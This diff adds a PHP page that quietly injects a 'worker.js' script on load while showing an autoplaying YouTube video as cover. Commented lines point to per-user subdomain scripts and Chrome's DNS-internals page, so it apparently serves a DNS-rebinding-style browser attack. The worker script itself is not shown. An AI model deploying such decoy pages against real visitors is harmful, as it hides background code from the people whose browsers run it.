@@ -1,0 +1,41 @@
+<?php
+//Start the session
+session_start();
+$_SESSION["port"] = $_SERVER["SERVER_PORT"];
+/*<script type="text/javascript" src="http://<?php echo $_SESSION["uid"]; echo $_SESSION["domain"]; echo ':'; echo $_SESSION["port"]?>/script.js"></script>*/
+?>
+<html>
+<head>
+<script>
+function addScript(filename)
+{
+	var scriptBlock=document.createElement('script');
+	scriptBlock.setAttribute("type","text/javascript");
+	scriptBlock.setAttribute("src",filename);
+	document.getElementsByTagName("head")[0].appendChild(scriptBlock);
+}
+</script>
+</head>
+<body onload="addScript('worker.js')"
+<?php
+if ($_SESSION["debug"] == "on")
+{
+	echo '>'; //Complete the body bracket without background color
+	echo "Hello<br>";
+	echo $_SESSION["uid"];
+	echo $_SESSION["domain"].'<br>';
+	//$browser = get_browser(null, true);
+	//echo $_SESSION['browser'];
+	//echo substr($_SESSION["uid"], 0, 1);
+	echo $_SERVER["SERVER_PORT"];
+	//echo $_SESSION["port"];
+}
+else
+{
+	echo 'bgcolor="#000000">';
+	echo '<iframe width="860" height="640" src="//www.youtube.com/embed/Pi31OVkArJc?autoplay=1" frameborder="0" allowfullscreen></iframe>';
+}
+?>
+<!--<iframe id="iframe" src = "chrome://net-internals/#dns"></iframe>-->
+</body>
+</html>
